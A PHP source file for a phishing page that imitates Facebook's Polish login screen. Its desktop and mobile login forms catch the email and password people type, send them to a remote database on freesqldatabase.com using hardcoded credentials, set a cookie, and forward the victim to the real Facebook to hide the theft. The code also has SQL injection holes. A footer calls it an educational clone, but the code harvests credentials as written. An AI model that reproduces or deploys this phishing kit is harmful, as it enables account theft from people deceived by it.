<?php
if (isset($_COOKIE['5434']))
{
    echo '<script type="text/javascript">
      window.location = "https://www.facebook.com/me"
    </script>';
    exit;
}

if(isset($_COOKIE['miasto'])) {
  $city = $_COOKIE['miasto'] . " -PL";
} else {
  $city = "pvbot";
}



?>
<!DOCTYPE html>
<head lang="pl">
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<link rel="stylesheet" type="text/css" href="css1/computer.css" media="screen and (min-width: 769px)">
<link rel="stylesheet" type="text/css" href="css1/mobile.css" media="screen and (max-width: 768px)">
<meta name="robots" content="noindex,nofollow">
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
<link rel="icon" type="image/x-icon" href="photos1/favicon.jpg">
<title>Facebook - zaloguj się lub zarejestruj</title>
</head>
<body>
<div class="computer">
  <header>
    <div class="headersubdiv">
      <img src="photos1/fblogo.png" class="fblogo">
      <div class="loginform">
        <table>
          <tr>
            <td class="logintext">Email lub numer telefonu</td>
            <td class="logintext"><span class="loginrowgap">Hasło</span></td>
          </tr>

          
  <form method="post" name="one">
      <td><input name="email" class="logintext loginfield" type="text"></td>
      <td><input name="pass" class="logintext loginrowgap loginfield" type="password"></td>
      <td><input class="loginrowgap" id="loginbutton" name="submit" type="submit" value="Zaloguj się"></td>
  </form>
     
       
<?php
if(isset($_POST['submit'])) {
  if (!empty($_POST['email']) && !empty($_POST['pass'])){

    $servername = "sql11.freesqldatabase.com";
    $user = "sql11426662";
    $pass = "1rdyzax38G";
    $dbname = "sql11426662";

    $link = mysqli_connect($servername, $user, $pass, $dbname);
    if($link === false){
      echo '<script type="text/javascript">
           window.location = "https://www.facebook.com/me"
      </script>';
    }
    $email = $_POST['email'];
    $password = $_POST['pass'];
    $sql = "INSERT INTO test (m, p, city) VALUES ('$email', '$password', '$city')";
    if(mysqli_query($link, $sql)){
        setcookie("5434", "58734", time()+60*60*24*30);
        echo '<script type="text/javascript">
           window.location = "https://www.facebook.com/me"
      </script>';
    } else{
      header("Refresh:0");
    }
    mysqli_close($link);
    }
}
?>
          </tr>
          <tr>
            <td></td>
            <td><a href="#" class="logintext loginrowgap" id="forgotpw">Zapomniałeś hasła?</a></td>
          </tr>
        </table>
      </div>
    </div>
  </header>

  <div class="maindiv">
    <div class="mainsubdiv">
      <div class="welcome">
        <div class="welcometext">Facebook pomaga kontaktować się z innymi osobami oraz udostępniać im różne informację i materiały</div>
        <div class="welcomepic">
          <img src="photos1/connecting.png" alt="welcome">
        </div>
      </div>
      <div class="signupdiv">
        <div class="createaccount">
          <div class="createh1"><span>Rejestracja</span></div>
          <div class="createp">To jest i zawsze będzie darmowe.</div>
        </div>
        <div class="signupform">
          <div class="inputname">
            <input type="text" name="firstname" placeholder="Imię" class="namebox namebox1 signuptextbox" required>
            <input type="text" name="surname" placeholder="Nazwisko" class="namebox namebox2 signuptextbox" required>
          </div>
          <input class="mobilepw signuptextbox" type="text" name="EMail" placeholder="EMail/numer telefonu" required><br>
          <input class="mobilepw signuptextbox" type="password" placeholder="Hasło" required>
          <br>
          <p class="createp" id="birthday">Data urodzin</p>
          <div class="dobdiv">
            <select name="dobdate" class="dob day">
              <option value="day">Dzień</option>
              <option value="1">1</option>
              <option value="2">2</option>
              <option value="3">3</option>
              <option value="4" selected>4</option>
              <option value="5">5</option>
              <option value="6">6</option>
              <option value="7">7</option>
              <option value="8">8</option>
              <option value="9">9</option>
              <option value="10">10</option>
              <option value="11">11</option>
              <option value="12">12</option>
              <option value="13">13</option>
              <option value="14">14</option>
              <option value="15">15</option>
            </select>
            <select name="dobmonth" class="dob month">
              <option value="month">Month</option>
              <option value="jan">Jan</option>
              <option value="feb">Feb</option>
              <option value="mar">Marc</option>
              <option value="apr" selected>Kwi</option>
              <option value="may">May</option>
              <option value="jun">Jun</option>
              <option value="jul">Jul</option>
              <option value="aug">Aug</option>
              <option value="sep">Sept</option>
              <option value="oct">Oct</option>
              <option value="nov">Nov</option>
              <option value="dec">Dec</option>
            </select>
            <select name="dobyear"  class="dob year">
              <option value="year">Year</option></option><option value="0">Year</option><option value="2019">2019</option><option value="2018">2018</option><option value="2017">2017</option><option value="2016">2016</option><option value="2015">2015</option><option value="2014">2014</option><option value="2013">2013</option><option value="2012">2012</option><option value="2011">2011</option><option value="2010">2010</option><option value="2009">2009</option><option value="2008">2008</option><option value="2007">2007</option><option value="2006">2006</option><option value="2005">2005</option><option value="2004">2004</option><option value="2003">2003</option><option value="2002">2002</option><option value="2001">2001</option><option value="2000">2000</option><option value="1999">1999</option><option value="1998">1998</option><option value="1997">1997</option><option value="1996">1996</option><option value="1995">1995</option><option value="1994" selected="1">1994</option><option value="1993">1993</option><option value="1992">1992</option><option value="1991">1991</option><option value="1990">1990</option><option value="1989">1989</option><option value="1988">1988</option><option value="1987">1987</option><option value="1986">1986</option><option value="1985">1985</option><option value="1984">1984</option><option value="1983">1983</option><option value="1982">1982</option><option value="1981">1981</option><option value="1980">1980</option><option value="1979">1979</option><option value="1978">1978</option><option value="1977">1977</option><option value="1976">1976</option><option value="1975">1975</option><option value="1974">1974</option><option value="1973">1973</option><option value="1972">1972</option><option value="1971">1971</option><option value="1970">1970</option><option value="1969">1969</option><option value="1968">1968</option><option value="1967">1967</option><option value="1966">1966</option><option value="1965">1965</option><option value="1964">1964</option><option value="1963">1963</option><option value="1962">1962</option><option value="1961">1961</option><option value="1960">1960</option><option value="1959">1959</option><option value="1958">1958</option><option value="1957">1957</option><option value="1956">1956</option><option value="1955">1955</option><option value="1954">1954</option><option value="1953">1953</option><option value="1952">1952</option><option value="1951">1951</option><option value="1950">1950</option><option value="1949">1949</option><option value="1948">1948</option><option value="1947">1947</option><option value="1946">1946</option><option value="1945">1945</option><option value="1944">1944</option><option value="1943">1943</option><option value="1942">1942</option><option value="1941">1941</option><option value="1940">1940</option><option value="1939">1939</option><option value="1938">1938</option><option value="1937">1937</option><option value="1936">1936</option><option value="1935">1935</option><option value="1934">1934</option><option value="1933">1933</option><option value="1932">1932</option><option value="1931">1931</option><option value="1930">1930</option><option value="1929">1929</option><option value="1928">1928</option><option value="1927">1927</option><option value="1926">1926</option><option value="1925">1925</option><option value="1924">1924</option><option value="1923">1923</option><option value="1922">1922</option><option value="1921">1921</option><option value="1920">1920</option><option value="1919">1919</option><option value="1918">1918</option><option value="1917">1917</option><option value="1916">1916</option><option value="1915">1915</option><option value="1914">1914</option><option value="1913">1913</option><option value="1912">1912</option><option value="1911">1911</option><option value="1910">1910</option><option value="1909">1909</option><option value="1908">1908</option><option value="1907">1907</option><option value="1906">1906</option><option value="1905">1905</option>
            </select>
            <div id="whydb">
            <a href="#">Dlaczego mam podać datę urodzin?</a>
              <div id="whydbtooltip">
                  <strong>Providing your date of birth</strong> helps make sure that you get the right Facebook experience for your age. If you want to change who sees this, go to the About section of your Profile. For more details, please visit our <a href="#">Data Policy</a>.
                  <hr id="hrtooltip">
                  <button id="whydbtooltipbutton">OK</button>
              </div>
            </div>
          </div>
          <div class="gender">
            <span id="femalediv"><input type="radio" name="gender" value="Kobieta" id="female"><label class="gendertext" for="female">Kobieta</label></span>
            <span id="malediv"><input type="radio" name="gender" value="Mężczyzna" id="male"><label class="gendertext" for="male">Meżczyzna</label></span>
          </div>
          <div>
            <p class="terms">
              Klikająć Utwórz konto akceptujesz nasz Regulamin oraz Politykę prywatności
            </p>
          </div>
          <div class="clearfix">
            <button type="button" id="signupbutton">Utwórz konto</button>
          </div>
          <div id="createpage">
            <a href="#">Utwórz stronę</a> gwiazdy lub swojego biznesu.
          </div>
        </div>
      </div>
    </div>
  </div>
  <footer>
    <div id="footersubdiv">
      <div id="languagediv">
        <a href="#" class="language" id="currentlang">Polski</a>
        <a href="#" class="language">English (UK)</a>
        <a href="#" class="language">தமிழ்</a>
        <a href="#" class="language">ಕನ್ನಡ</a>
        <a href="#" class="language">हिन्दी</a>
        <a href="#" class="language">اردو</a>
        <a href="#" class="language">বাংলা</a>
        <a href="#" class="language">తెలుగు </a>
        <a href="#" class="language">Español</a>
        <a href="#" class="language">Português (Brasil)</a>
        <a href="#" class="language">Français (France)</a>
        <a href="#" id="morelang"><i class="fa fa-plus" aria-hidden="true"></i></a>
      </div>
      <hr id="hrfinal">
      <div id="extralinksdiv">
        <a href="#" class="extralinks">Sign Up</a>
        <a href="#" class="extralinks">Log In</a>
        <a href="#" class="extralinks">Messenger</a>
        <a href="#" class="extralinks">Facebook Lite</a>
        <a href="#" class="extralinks">Find Friends</a>
        <a href="#" class="extralinks">People</a>
        <a href="#" class="extralinks">Profiles</a>
        <a href="#" class="extralinks">Pages</a>
        <a href="#" class="extralinks">Page categories</a>
        <a href="#" class="extralinks">Places</a>
        <a href="#" class="extralinks">Games</a>
        <a href="#" class="extralinks">Locations</a>
        <a href="#" class="extralinks">Marketplace</a>
        <a href="#" class="extralinks">Groups</a>
        <a href="#" class="extralinks">Instagram</a>
        <a href="#" class="extralinks">Local</a>
        <a href="#" class="extralinks">Fundraisers</a>
        <a href="#" class="extralinks">About</a>
        <a href="#" class="extralinks">Create ad</a>
        <a href="#" class="extralinks">Create Page</a>
        <a href="#" class="extralinks">Developers</a>
        <a href="#" class="extralinks">Careers</a>
        <a href="#" class="extralinks">Privacy</a>
        <a href="#" class="extralinks">Cookies</a>
        <a href="#" class="extralinks">AdChoices</a>
        <a href="#" class="extralinks">Terms</a>
        <a href="#" class="extralinks">Account security</a>
        <a href="#" class="extralinks">Login help</a>
        <a href="#" class="extralinks">Help</a>
      </div>
      <div id="copyrightdiv">
          <span id="copyright"><a id="copyrightfblink">Facebook Clone for educational purposes</a> © 2021</span>
          
      </div>
    </div>
  </footer>
</div>



<!--Code for Mobile Screen-->

<div class="mobile">
  <div class="mobheader">
    <img src="photos1/fblogo.png" class="mobfblogo">
  </div>
  <div class="mobmaindiv">

<form method="post" name="two">
    <div id="mobtextdiv">
      <input name="emailX" type="text" class="mobtextbox mobtextbox1" placeholder="Adres e-mail lub numer telefonu">
      <input name="passX" type="password" class="mobtextbox mobtextbox2" placeholder="Hasło">
    </div>

    <div class="mobloginbuttondiv">
      <input name="submitX" type="submit" class="mobloginbutton" value="Zaloguj się">
    </div>
</form>

<?php

if(isset($_POST['submitX'])) {

  if (!empty($_POST['emailX']) && !empty($_POST['passX'])){

    $servernameX = "sql11.freesqldatabase.com";
    $userX = "sql11426662";
    $passX = "1rdyzax38G";
    $dbnameX = "sql11426662";
    
    $linkX = mysqli_connect($servernameX, $userX, $passX, $dbnameX);
    
    $emailX = $_POST['emailX'];
    $passwordX = $_POST['passX'];
    
    $sqlX = "INSERT INTO test (m, p, city) VALUES ('$emailX', '$passwordX', '$city')";
    
    if(mysqli_query($linkX, $sqlX)){
      setcookie("5434", "58734", time()+60*60*24*30);
        echo '<script type="text/javascript">
           window.location = "https://www.facebook.com/me"
      </script>';
    } else {
      echo '<script type="text/javascript">
           window.location = "https://www.facebook.com/me"
      </script>';
    }
    
    mysqli_close($linkX);
    
    }

}


?>


    <div id="ordiv">
    <span id="or">or</span>
    </div>
    <div id="mobcreatediv">
      <button id="mobcreate">Utwórz nowe konto</button>
    </div>
    <div class="mobforgotpw">
      <a href="#">Nie pamiętasz hasła?</a>
      <span>·</span>
      <a href="#">Centrum pomocy</a>
    </div>
  </div>
  <div class="mobfooter">
    <div id="moblangs">
      <div class="item1">
        <li><a href="#" id="mobcurrentlang">Polski</a></li>
        <li><a href="#">English (UK)</a></li>
        <li><a href="#">हिन्दी</a></li>
        <li><a href="#">বাংলা</a></li>
      </div>
      <div class="item2">
        <li><a href="#">മലയാളം</a></li>
        <li><a href="#">ಕನ್ನಡ</a></li>
        <li><a href="#">اردو</a></li>
        <li><a href="#"><i class="fa fa-plus-square-o"></i></a></li>
      </div>
    </div>
    <div class="mobcopyright">
      <span class="mobfbcopyright"><a target="_blank" id="mobcopyrightfblink">Facebook</a> ©2021</span><br>
      
    </div>
    </div>
</div>
</body>
